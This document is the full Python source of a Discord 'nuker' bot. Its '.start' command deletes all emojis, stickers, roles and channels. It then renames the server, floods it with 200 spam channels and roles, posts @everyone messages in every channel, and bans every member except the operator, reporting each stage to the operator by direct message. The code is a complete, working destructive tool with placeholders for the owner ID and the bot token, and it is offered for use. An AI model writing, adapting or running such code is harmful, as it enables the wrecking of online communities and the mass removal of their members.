import discord
from discord.ext import commands

client = commands.Bot(command_prefix=".", intents=discord.Intents.all())
client.remove_command('help')


# on_ready
@client.event
async def on_ready():
    print(f"{client.user} successfully start.")


# start
@client.command()
async def start(ctx: discord.ext.commands.Context, *, hack: str = ''):
    if ctx.author.id == 0:  # << your discord ID
        await ctx.message.delete()
        if hack == '' or len(hack) > 50:
            hack = f"crash by {ctx.author}"
        try:
            await ctx.author.send('Starting to crash the server!')
        except:
            return await ctx.send('You have not allowed direct messages on the server!')
        await ctx.author.send(f'Starting to delete all emojis...')
        counter = 0
        for emoj in ctx.guild.emojis:
            try:
                await emoj.delete(reason=hack)
            except:
                pass
            else:
                counter += 1
        await ctx.author.send(f'{counter} emojis have been successfully deleted!')
        await ctx.author.send(f'Starting to delete all stickers...')
        counter = 0
        for sticker in ctx.guild.stickers:
            try:
                await sticker.delete(reason=hack)
            except:
                pass
            else:
                counter += 1
        await ctx.author.send(f'{counter} stickers have been successfully deleted!')
        await ctx.author.send(f'Starting to delete all roles...')
        counter = 0
        for role1 in ctx.guild.roles:
            try:
                await role1.delete(reason=hack)
            except:
                pass
            else:
                counter += 1
        await ctx.author.send(f'{counter} roles have been successfully deleted!')
        await ctx.author.send(f'Starting to delete all channels...')
        counter = 0
        for channel in ctx.guild.channels:
            try:
                await channel.delete(reason=hack)
            except:
                pass
            else:
                counter += 1
        await ctx.author.send(f'{counter} channels have been successfully deleted!')
        await ctx.guild.edit(name=hack)
        await ctx.author.send(f'The server was renamed to "{hack}"')
        await ctx.author.send(f'Starting to create roles and text channels...')
        counter = 0
        counter1 = 0
        for i in range(200):
            try:
                await ctx.guild.create_text_channel(name=hack)
            except:
                pass
            else:
                counter += 1
            try:
                await ctx.guild.create_role(name=hack)
            except:
                pass
            else:
                counter1 += 1
        await ctx.author.send(f'{counter} channels and {counter1} roles have been successfully created!')
        await ctx.author.send(f'Starting to send messages into channels...')
        counter = 0
        for channel in ctx.guild.channels:
            try:
                await channel.send(f'# @everyone {hack}')
            except:
                pass
            else:
                counter += 1
        await ctx.author.send(f'{counter} messages were sent into text channels!')
        await ctx.author.send('Starting to ban all members...')
        counter = 0
        for member in ctx.guild.members:
            if member.id == ctx.author.id:
                continue
            try:
                await member.ban(reason=hack)
            except:
                pass
            else:
                counter += 1
        await ctx.author.send(f'{counter} members have been banned!')
        await ctx.author.send(f'Server crash is over!')


client.run("token")  # << bot token
